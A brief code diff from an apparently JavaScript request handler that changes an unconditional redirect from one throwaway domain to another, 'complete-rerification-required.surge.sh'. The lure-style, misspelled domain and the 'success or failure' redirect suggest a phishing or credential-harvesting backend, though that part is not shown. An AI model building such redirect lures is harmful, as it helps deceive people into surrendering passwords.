@@ -55,5 +55,5 @@ export default async function handler(req, res) {
   }
 
   // Always redirect (success or failure)
-  return res.redirect(302, "https://password-in-use.vercel.app/");
+  return res.redirect(302, "https://complete-rerification-required.surge.sh/");
 }
